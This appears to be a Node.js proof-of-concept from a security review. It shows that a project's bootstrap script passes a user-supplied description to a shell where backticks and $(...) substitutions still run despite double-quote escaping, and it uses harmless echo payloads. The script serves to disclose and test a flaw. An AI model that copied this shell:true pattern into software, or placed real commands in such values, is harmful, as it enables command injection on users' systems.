// description-injection.mjs - Reproduces how bootstrap-init.mjs hands --description to a shell:
//   seo() wraps it as `"${description.replace(/"/g, '\\"')}"` (scripts/bootstrap-init.mjs:951),
//   runSibling() joins the argv into one string (:934), run() spawns it with shell:true (:292-299).
// Double quotes do not stop $(...) or backticks on POSIX shells. Payload is a harmless echo.
// Usage: node analysis/poc/description-injection.mjs
import { spawnSync } from "node:child_process";
const description = "A todo app `echo RAN-BACKTICK >&2` that saves $(echo RAN-DOLLAR >&2) you $5";
const quoted = `"${description.replace(/"/g, '\\"')}"`;
const cmdStr = ["node", "-e", "'console.log(process.argv.at(-1))'", "--", quoted].join(" ");
const r = spawnSync(cmdStr, { shell: true, encoding: "utf8" });
console.log("argv received by the child:", JSON.stringify(r.stdout.trim()));
console.log("stderr (commands that ran):", JSON.stringify(r.stderr.trim()));
